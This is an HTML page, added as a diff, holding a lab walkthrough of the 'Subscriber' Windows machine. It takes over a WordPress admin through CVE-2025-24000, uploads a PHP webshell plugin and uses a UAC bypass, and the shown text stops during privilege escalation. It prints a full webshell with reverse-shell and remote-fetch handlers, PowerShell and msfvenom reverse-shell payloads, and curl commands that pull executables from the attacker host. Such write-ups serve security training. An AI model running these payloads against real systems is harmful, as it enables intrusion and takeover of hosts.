@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Subscriber - Complete Penetration Testing WalkthroughIntroductionThis is a complete walkthrough and writeup for the Subscriber machine from the Ronin66 lab. Subscriber is a standalone Windows box runn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ronin66-Subscriber">
+<meta property="og:url" content="https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Subscriber - Complete Penetration Testing WalkthroughIntroductionThis is a complete walkthrough and writeup for the Subscriber machine from the Ronin66 lab. Subscriber is a standalone Windows box runn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Subscriber/found-user-wp.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Subscriber/root-shell.png">
+<meta property="article:published_time" content="2026-09-17T07:50:52.000Z">
+<meta property="article:modified_time" content="2026-09-17T07:52:05.507Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Ronin66">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Subscriber/found-user-wp.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Ronin66-Subscriber</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/09/16/Ronin66-Punk/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&text=Ronin66-Subscriber"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&title=Ronin66-Subscriber"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&is_video=false&description=Ronin66-Subscriber"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ronin66-Subscriber&body=Check out this article: https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&title=Ronin66-Subscriber"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&title=Ronin66-Subscriber"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&title=Ronin66-Subscriber"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&title=Ronin66-Subscriber"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&name=Ronin66-Subscriber&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&t=Ronin66-Subscriber"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Subscriber-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Subscriber - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">Web Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress-%E2%80%94-Post-SMTP-3-2-0"><span class="toc-number">1.3.1.</span> <span class="toc-text">WordPress — Post SMTP 3.2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">1.3.2.</span> <span class="toc-text">User Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-%E2%80%94-CVE-2025-24000"><span class="toc-number">1.4.</span> <span class="toc-text">Exploitation — CVE-2025-24000</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-a-Foothold-Account"><span class="toc-number">1.4.1.</span> <span class="toc-text">Creating a Foothold Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Running-the-Exploit"><span class="toc-number">1.4.2.</span> <span class="toc-text">Running the Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-%E2%80%94-Malicious-Plugin-Upload"><span class="toc-number">1.5.</span> <span class="toc-text">Initial Access — Malicious Plugin Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Building-the-Webshell-Plugin"><span class="toc-number">1.5.1.</span> <span class="toc-text">Building the Webshell Plugin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-a-Reverse-Shell"><span class="toc-number">1.5.2.</span> <span class="toc-text">Getting a Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-%E2%80%94-UAC-Bypass-SspiUacBypass"><span class="toc-number">1.6.</span> <span class="toc-text">Privilege Escalation — UAC Bypass (SspiUacBypass)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Situation"><span class="toc-number">1.6.1.</span> <span class="toc-text">The Situation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Staging-the-Payloads"><span class="toc-number">1.6.2.</span> <span class="toc-text">Staging the Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Executing-the-Bypass"><span class="toc-number">1.6.3.</span> <span class="toc-text">Executing the Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.7.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools-Used"><span class="toc-number">1.8.</span> <span class="toc-text">Tools Used</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Ronin66-Subscriber
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-09-17T07:50:52.000Z" class="dt-published" itemprop="datePublished">2026-09-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Ronin66/" rel="tag">Ronin66</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Subscriber-Complete-Penetration-Testing-Walkthrough"><a href="#Subscriber-Complete-Penetration-Testing-Walkthrough" class="headerlink" title="Subscriber - Complete Penetration Testing Walkthrough"></a>Subscriber - Complete Penetration Testing Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is a complete walkthrough and writeup for the <strong>Subscriber</strong> machine from the Ronin66 lab. Subscriber is a standalone Windows box running a WordPress site on Apache&#x2F;PHP. The chain starts with enumerating a vulnerable WordPress plugin, abusing <strong>CVE-2025-24000</strong> (Post SMTP password reset token disclosure) to take over an admin account, uploading a malicious plugin for remote code execution, and finally abusing UAC via <strong>SspiUacBypass</strong> to escalate to a high-integrity shell and grab the root flag.</p>
+<p><strong>Tools Used:</strong> Nmap, WPScan, Python3 (custom exploit), curl, msfvenom, SspiUacBypass</p>
+<p><strong>Difficulty:</strong> Easy &#x2F; Medium</p>
+<p><strong>Key Techniques:</strong> WordPress user enumeration, CVE-2025-24000 (Post SMTP token disclosure), malicious plugin upload, webshell RCE, UAC bypass (SspiUacBypass)</p>
+<hr>
+<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p>We begin with a full port scan to map out what’s exposed:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -sC 172.16.18.14 -p- -vvvv</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)</span><br><span class="line">|_http-title: Did not follow redirect to http://samurai.local/samurai/</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp   open  ssl/http      Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">3306/tcp  open  mysql         MariaDB 10.3.23 or earlier (unauthorized)</span><br><span class="line">5040/tcp  open  unknown</span><br><span class="line">7680/tcp  open  pando-pub?</span><br><span class="line">49664-49672/tcp open msrpc    Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+<p>Right away the HTTP redirect tells us the site is at <code>http://samurai.local/samurai/</code>, so we add the entry to our hosts file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;172.16.18.14 samurai.local&quot; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>Notable from the scan:</p>
+<ul>
+<li><strong>Port 80 &#x2F; 443</strong>: Apache 2.4.58 with PHP 8.2.12 — a XAMPP-style Windows stack</li>
+<li><strong>Port 3306</strong>: MariaDB, but <code>unauthorized</code> means no unauthenticated access</li>
+<li><strong>Ports 135 &#x2F; 139 &#x2F; 445</strong>: SMB and RPC — noted but the web stack is the intended entry point</li>
+</ul>
+<hr>
+<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><h3 id="WordPress-—-Post-SMTP-3-2-0"><a href="#WordPress-—-Post-SMTP-3-2-0" class="headerlink" title="WordPress — Post SMTP 3.2.0"></a>WordPress — Post SMTP 3.2.0</h3><p>Browsing to <code>http://samurai.local/samurai/</code> we find a WordPress installation. Version fingerprinting via WPScan quickly reveals the installed plugin stack includes <strong>Post SMTP 3.2.0</strong>.</p>
+<p>Post SMTP 3.2.0 is vulnerable to <strong>CVE-2025-24000</strong> — a password reset token disclosure bug. A low-privilege subscriber account can query the Post SMTP log API (authenticated via a REST nonce) and retrieve the full body of any password-reset email the plugin processed, including the reset link. That means: create a low-priv account, trigger a password reset for any user, read the token straight out of the mail log, and take over the account.</p>
+<h3 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h3><p>Before we can target anyone, we need a valid username. WPScan’s enumeration mode handles that:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://samurai.local/samurai/ -e u</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Subscriber/found-user-wp.png" alt="found-user-wp"></p>
+<p>We find the user <strong>shogun</strong>. That’s our target for the password reset.</p>
+<hr>
+<h2 id="Exploitation-—-CVE-2025-24000"><a href="#Exploitation-—-CVE-2025-24000" class="headerlink" title="Exploitation — CVE-2025-24000"></a>Exploitation — CVE-2025-24000</h2><h3 id="Creating-a-Foothold-Account"><a href="#Creating-a-Foothold-Account" class="headerlink" title="Creating a Foothold Account"></a>Creating a Foothold Account</h3><p>The exploit requires an account we already control (even subscriber-level) to authenticate to the REST API and pull the log. We register a low-privilege account through WordPress’s normal registration flow:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;REDACTED&gt; : &lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Running-the-Exploit"><a href="#Running-the-Exploit" class="headerlink" title="Running the Exploit"></a>Running the Exploit</h3><p>With our foothold account and the target username in hand, we run the custom exploit. The script:</p>
+<ol>
+<li>Triggers a password reset for <strong>shogun</strong></li>
+<li>Logs in as our low-priv account and extracts the REST API nonce</li>
+<li>Queries <code>wp-json/psd/v1/get-logs</code> to find the reset email</li>
+<li>Pulls the full email body from <code>wp-json/psd/v1/get-details</code> and extracts the reset link</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py \</span><br><span class="line">  --url http://samurai.local/samurai/ \</span><br><span class="line">  --username &lt;REDACTED&gt; \</span><br><span class="line">  --password &lt;REDACTED&gt; \</span><br><span class="line">  --email shogun</span><br></pre></td></tr></table></figure>
+
+<p>The script returns a live WordPress password-reset link. We follow it in the browser and set a new password for <strong>shogun</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shogun : &lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We now have full admin access to the WordPress installation.</p>
+<hr>
+<h2 id="Initial-Access-—-Malicious-Plugin-Upload"><a href="#Initial-Access-—-Malicious-Plugin-Upload" class="headerlink" title="Initial Access — Malicious Plugin Upload"></a>Initial Access — Malicious Plugin Upload</h2><h3 id="Building-the-Webshell-Plugin"><a href="#Building-the-Webshell-Plugin" class="headerlink" title="Building the Webshell Plugin"></a>Building the Webshell Plugin</h3><p>With WordPress admin credentials we can upload plugins. We build a minimal malicious plugin that gives us command execution, file write, remote fetch, and a reverse-shell handler — all in one PHP file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; shell-plugin/shell-plugin.php &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">Plugin Name: Shell</span><br><span class="line">*/</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . shell_exec(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>; die();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;writefile&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$result</span> = file_put_contents(<span class="variable">$path</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$result</span> !== <span class="literal">false</span> ? <span class="string">&quot;[+] Written <span class="variable">$result</span> bytes to <span class="variable">$path</span>&quot;</span> : <span class="string">&quot;[!] Write failed&quot;</span>; die();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;fetch&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span>  = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$dest</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;dest&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span> === <span class="literal">false</span>)&#123; <span class="built_in">echo</span> <span class="string">&quot;[!] Fetch failed&quot;</span>; die(); &#125;</span><br><span class="line">    <span class="variable">$result</span> = file_put_contents(<span class="variable">$dest</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$result</span> !== <span class="literal">false</span> ? <span class="string">&quot;[+] Written <span class="variable">$result</span> bytes to <span class="variable">$dest</span>&quot;</span> : <span class="string">&quot;[!] Write failed&quot;</span>; die();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rev&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;ip&#x27;</span>] ?? <span class="string">&#x27;10.8.0.36&#x27;</span>;</span><br><span class="line">    <span class="variable">$port</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;port&#x27;</span>] ?? 4444;</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    <span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, (int)<span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 10);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$sock</span>)&#123; die(<span class="string">&quot;Socket failed: <span class="variable">$errstr</span>&quot;</span>); &#125;</span><br><span class="line">    <span class="variable">$proc</span> = proc_open(<span class="string">&#x27;cmd.exe&#x27;</span>, [0=&gt;<span class="variable">$sock</span>,1=&gt;<span class="variable">$sock</span>,2=&gt;<span class="variable">$sock</span>], <span class="variable">$pipes</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$proc</span>)&#123; proc_close(<span class="variable">$proc</span>); &#125;</span><br><span class="line">    fclose(<span class="variable">$sock</span>); die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">rm</span> -f shell-plugin.zip &amp;&amp; zip -r shell-plugin.zip shell-plugin/</span><br></pre></td></tr></table></figure>
+
+<p>We navigate to <strong>Plugins → Add New → Upload Plugin</strong>, upload the zip, and activate it. The shell is immediately reachable at:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://samurai.local/samurai/wp-content/plugins/shell-plugin/shell-plugin.php</span><br></pre></td></tr></table></figure>
+
+<p>A quick sanity check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s &quot;http://samurai.local/samurai/wp-content/plugins/shell-plugin/shell-plugin.php?cmd=whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Getting-a-Reverse-Shell"><a href="#Getting-a-Reverse-Shell" class="headerlink" title="Getting a Reverse Shell"></a>Getting a Reverse Shell</h3><p>The standard base64-encoded payloads get blocked by Defender. The direct PowerShell TCP socket approach doesn’t — we pass the full command through <code>--data-urlencode</code> to keep the special characters intact:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s &quot;http://samurai.local/samurai/wp-content/plugins/shell-plugin/shell-plugin.php&quot; \</span><br><span class="line">  --data-urlencode &quot;cmd=cmd.exe /c \&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe \</span><br><span class="line">  -nop -w hidden -c \$c=New-Object Net.Sockets.TCPClient(&#x27;10.8.0.36&#x27;,4444);\</span><br><span class="line">  \$s=\$c.GetStream();iex(New-Object IO.StreamReader(\$s)).ReadToEnd()\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>We catch the callback on our listener. One quirk worth noting: <strong>output only comes back when the shell closes</strong>, so commands run blind until you exit — keep that in mind when running anything interactive.</p>
+<p>We grab the user flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:/Users/Public/user.flg</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Privilege-Escalation-—-UAC-Bypass-SspiUacBypass"><a href="#Privilege-Escalation-—-UAC-Bypass-SspiUacBypass" class="headerlink" title="Privilege Escalation — UAC Bypass (SspiUacBypass)"></a>Privilege Escalation — UAC Bypass (SspiUacBypass)</h2><h3 id="The-Situation"><a href="#The-Situation" class="headerlink" title="The Situation"></a>The Situation</h3><p>The shell lands us at <strong>medium integrity</strong> as the <code>subscriber</code> user. The root flag needs high integrity. Defender is active, so the usual token-abuse routes are noisy. Instead we use <strong>SspiUacBypass</strong> — a UAC bypass that abuses SSPI to elevate without triggering a UAC prompt.</p>
+<p>We compile the project from source:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/antonioCoco/SspiUacBypass</span><br></pre></td></tr></table></figure>
+
+<h3 id="Staging-the-Payloads"><a href="#Staging-the-Payloads" class="headerlink" title="Staging the Payloads"></a>Staging the Payloads</h3><p>We need two shells: one to land at medium integrity (already have it), and a second that <code>SspiUacBypass</code> will launch at high integrity. We build both:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.36 LPORT=9001 -f exe -o /tmp/shell.exe</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.36 LPORT=9002 -f exe -o /tmp/shell2.exe</span><br></pre></td></tr></table></figure>
+
+<p>We serve them and use the plugin’s <code>fetch</code> handler to pull everything onto the target:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp &amp;&amp; python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -s &quot;http://samurai.local/samurai/wp-content/plugins/shell-plugin/shell-plugin.php?fetch=1&amp;url=http://10.8.0.36:8080/SspiUacBypass.exe&amp;dest=C:\\Users\\subscriber\\SspiUacBypass.exe&quot;</span><br><span class="line"></span><br><span class="line">curl -s &quot;http://samurai.local/samurai/wp-content/plugins/shell-plugin/shell-plugin.php?fetch=1&amp;url=http://10.8.0.36:8080/shell.exe&amp;dest=C:\\Users\\subscriber\\shell.exe&quot;</span><br><span class="line"></span><br><span class="line">curl -s &quot;http://samurai.local/samurai/wp-content/plugins/shell-plugin/shell-plugin.php?fetch=1&amp;url=http://10.8.0.36:8080/shell2.exe&amp;dest=C:\\Users\\subscriber\\shell2.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Executing-the-Bypass"><a href="#Executing-the-Bypass" class="headerlink" title="Executing the Bypass"></a>Executing the Bypass</h3><p>We trigger <code>shell.exe</code> first through the webshell to get a proper medium-integrity cmd session:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s &quot;http://samurai.local/samurai/wp-content/plugins/shell-plugin/shell-plugin.php&quot; \</span><br><span class="line">  --data-urlencode &quot;cmd=cmd.exe /c C:\Users\subscriber\shell.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Listener on <code>9001</code> catches it. From inside that shell we run the bypass, pointing it at our second payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SspiUacBypass.exe C:/Users/subscriber/shell2.exe</span><br></pre></td></tr></table></figure>
+
